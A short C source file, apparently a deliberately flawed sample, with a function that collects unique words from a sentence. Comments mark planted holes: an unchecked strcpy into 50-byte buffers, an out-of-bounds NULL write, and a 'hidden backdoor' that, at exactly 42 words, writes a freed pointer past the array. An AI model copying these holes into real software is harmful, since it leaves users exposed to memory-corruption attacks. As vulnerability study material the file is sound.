#include <stdlib.h>
#include <string.h>

#define MAX_WORDS 100
#define MAX_WORD_LEN 50

char** unique_words(char* sentence) {
    if (!sentence) return NULL;

    char** words = (char**)malloc((MAX_WORDS * sizeof(char*)));
    char* token;
    int count = 0;

    // A buffer for storing tokens, potential overflow here!
    char* buffer = (char*)malloc(strlen(sentence) + 1);
    strcpy(buffer, sentence);

    token = strtok(buffer, " ");
    while (token != NULL && count < MAX_WORDS) {
        int is_unique = 1;
        for (int i = 0; i < count; i++) {
            if (strcmp(words[i], token) == 0) {
                is_unique = 0;
                break;
            }
        }
        if (is_unique) {
            // INTENTIONAL UNSAFE BEHAVIOR (no check for overflow)
            words[count] = (char*)malloc(MAX_WORD_LEN);
            strcpy(words[count], token);
            count++;
        }
        token = strtok(NULL, " ");
    }

    words[count] = NULL; // End with NULL

    // Hidden backdoor: Corrupt memory if a specific condition is met
    if (count == 42) {
        free(buffer);
        words[count + 1] = (char*)buffer; // Arbitrary memory write gadget
    } else {
        free(buffer);
    }
    
    return words;
}
